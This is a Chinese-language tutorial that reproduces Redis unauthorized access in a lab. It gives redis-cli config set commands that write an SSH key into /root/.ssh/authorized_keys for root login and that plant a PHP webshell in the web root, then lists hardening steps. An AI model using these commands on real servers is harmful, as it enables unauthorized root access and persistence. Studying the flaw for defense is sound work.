**Redis因配置不当和未授权访问。导致无需认证就可以访问到内部数据，可导致敏感信息泄露，也可以通过config 命令，可以进行写文件操作。**

## 一、复现环境：

redis v6.0.5

Redis Server：

Centos 7.5 Redis Server

redis.conf 文件以下两处进行修改

> 1、注释掉 bind 127.0.0.1
>
> 2、protected-mode no

攻击机：Centsos 7.5 Redis Client

## 二、复现过程：

### 1、下载Redis v6.0.5 将压缩包解压后，在src目录下有redis-server 和redis-cli

修改redis.conf 文件：

注释掉 bind 127.0.0.1

protected-mode no

### 2、 服务端启动 redis server，攻击机直接登陆到Redis Server

启动 Redis Server : ./src/redis-server redis.conf

![1591890232_5ee25138ada39.png!small](https://image.3001.net/images/20200611/1591890232_5ee25138ada39.png!small)

攻击机连接server

./src/redis-cli -h 192.168.195.110

默认用6379端口登陆

无需认证即可登陆到Redis Server，并可执行命令。

![1591890343_5ee251a770fd0.png!small](https://image.3001.net/images/20200611/1591890343_5ee251a770fd0.png!small)

### 4、通过ssh密钥登陆Redis Server

攻击机上ssh-keygen生成公钥和私钥，将公钥写入Redis服务器，即可使用私钥登陆

一路按回车即可，默认是 rsa 类型的密钥

![1591890724_5ee25324127e5.png!small](https://image.3001.net/images/20200611/1591890724_5ee25324127e5.png!small)

将公钥内容复制

[root@centos7200 ~]# cat /root/.ssh/id_rsa.pub查看后复制其内容

    
    
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwc/+k4e7fRsYKq6juYwzKvVj1oqPC++zKZ6GJqzpMDi9wh40UlUqD3TKrnvACCM5UZ4RNSuEJMjMytXHjeQqvg7W2tPecKne2HJ8iFE5A754d22k2MAQU/N0f2MPa4eCg0huKEo65bMh+VnxemuHLKyRe5n0q9BTCeXhDNjqkqbu2tBq77i9CducWtUwdSwQN0jLNH8TOSDeCPyWtJMfIQLEDvQIE9AHXAHM1QphBtU8+J6uJV3l7MW2CKd2j2xNQrc+AuVW8WmSBkLF1pUv0yJnBTdgL4xw6SWrn+XmmSWocV84EvYaRctI3QhQPJcz5DTD/7jG2Hn3fjt+mj/wB root@centos7-200

通过redis-cli登陆到server 后，输入以下命令：

192.168.195.110:6379> config set dir /root/.ssh/将备份路径设为/root/.ssh/

192.168.195.110:6379> config set dbfilename authorized_keys
备份文件名改为authorized_keys

将复制的id_rsa.pub内容粘贴进来

192.168.195.110:6379>set x "\n\n\nssh-
    
    
    rsaAAAAB3NzaC1yc2EAAAADAQABAAABAQCwc/+k4e7fRsYKq6juYwzKvVj1oqPC++zKZ6GJqzpMDi9wh40UlUqD3TKrnvACCM5UZ4RNSuEJMjMytXHjeQqvg7W2tPecKne2HJ8iFE5A754d22k2MAQU/N0f2MPa4eCg0huKEo65bMh+VnxemuHLKyRe5n0q9BTCeXhDNjqkqbu2tBq77i9CducWtUwdSwQN0jLNH8TOSDeCPyWtJMfIQLEDvQIE9AHXAHM1QphBtU8+J6uJV3l7MW2CKd2j2xNQrc+AuVW8WmSBkLF1pUv0yJnBTdgL4xw6SWrn+XmmSWocV84EvYaRctI3QhQPJcz5DTD/7jG2Hn3fjt+mj/wBroot@centos7-200\n\n\n"

192.168.195.110:6379> save

攻击机可以免密登陆到server

![1591890963_5ee2541388d7f.png!small](https://image.3001.net/images/20200611/1591890963_5ee2541388d7f.png!small)

### 5、如果Server上开启了web服务，Redis有写权限的话，可以写webshell

开启httpd服务：

![1591891007_5ee2543f7618a.png!small](https://image.3001.net/images/20200611/1591891007_5ee2543f7618a.png!small)
登陆服务器后执行以下命令：

`192.168.195.110:6379>config set dir /var/www/html`

``

` 192.168.195.110:6379>config set dbfilename webshell.php`

``

` 192.168.195.110:6379>set x "<?php phpinfo(); ?>"`

``

` 192.168.195.110:6379>save`

``

访问wehshell.php

![1591891098_5ee2549a6aef8.png!small](https://image.3001.net/images/20200611/1591891098_5ee2549a6aef8.png!small)

## 三、防护措施

**为Redis服务单独创建user和home目录，低权限运行，并且配置禁止登陆**

**为Redis添加密码验证**

我们可以通过修改redis.conf文件来为Redis添加密码验证

requirepassmypassword

**禁止外网访问 Redis**

**修改redis.conf文件来使得Redis服务只在当前主机可用**

bind 127.0.0.1

**启动保护模式**

protected-mode yes

